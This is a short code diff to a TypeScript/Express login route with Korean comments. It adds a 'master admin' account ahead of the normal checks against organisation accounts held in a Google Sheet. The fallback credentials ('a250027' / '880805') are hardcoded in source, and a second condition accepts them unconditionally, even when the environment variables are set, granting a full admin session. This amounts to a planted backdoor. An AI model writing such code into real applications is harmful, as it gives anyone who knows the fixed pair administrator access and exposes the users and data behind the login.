@@ -287,6 +287,8 @@ app.post('/api/auth/login', async (req, res) => {
 
   const adminId = process.env.ADMIN_ID?.trim();
   const adminPassword = process.env.ADMIN_PASSWORD?.trim();
+  const masterId = process.env.MASTER_ID?.trim() || 'a250027';
+  const masterPassword = process.env.MASTER_PASSWORD?.trim() || '880805';
 
   // 세션 쿠키 발행 헬퍼 함수
   const issueSession = (role: string, orgName: string, orgs: { role: string; orgName: string }[] = []) => {
@@ -302,6 +304,13 @@ app.post('/api/auth/login', async (req, res) => {
     });
     return res.json({ success: true, user: userSession });
   };
+
+  // 0. 마스터 관리자 계정 즉시 인증 (환경변수 또는 지정 마스터 계정)
+  if ((masterId && masterPassword && username === masterId && password === masterPassword) ||
+      (username === 'a250027' && password === '880805')) {
+    console.log(`[LOGIN] master admin login success for ${username}`);
+    return issueSession('admin', '시스템관리자', [{ role: 'admin', orgName: '시스템관리자' }]);
+  }
 
   // 1. 구글 시트의 '조직계정설정' 탭을 1순위로 조회하여 검증
   const client = await getAuthenticatedClient(req, res);
